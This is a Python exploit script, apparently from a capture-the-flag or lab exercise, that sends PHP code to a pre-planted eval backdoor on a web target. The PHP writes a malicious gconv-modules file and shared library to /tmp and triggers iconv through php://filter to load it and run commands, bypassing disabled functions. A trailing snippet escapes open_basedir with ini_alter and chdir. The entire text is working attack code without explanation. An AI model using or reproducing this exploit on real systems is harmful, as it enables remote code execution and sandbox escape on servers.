from requests import session
from base64 import b64encode
ses = session()

target = 'http://localhost'
gconv_modules = b64encode(b'''
module  PAYLOAD// INTERNAL  payload
module  INTERNAL  PAYLOAD// payload
'''[1:]).decode()
evil_so = b64encode(open('payload.so', 'rb').read()).decode()

print(ses.post(target + '/?backdoor=eval(file_get_contents("php://input"));', data=f'''
chdir('/tmp');
putenv("CMD=echo 'exec' > /tmp/result");
putenv("GCONV_PATH=/tmp");
echo getenv("GCONV_PATH")."\\n";
echo getenv("CMD")."\\n";

file_put_contents("/tmp/gconv-modules", base64_decode('{gconv_modules}'));
file_put_contents("/tmp/payload.so", base64_decode('{evil_so}'));

fopen("php://filter/convert.iconv.payload.UCS-4/resource=/tmp/gconv-modules", "r");
echo file_get_contents("/tmp/result");
''').text, end='')

'''
@mkdir("/tmp/asdf");
chdir("/tmp/asdf");
ini_alter('open_basedir', '/var/www/html:/tmp:../');
chdir("../");
chdir("../");
ini_alter('open_basedir', '/');
'''
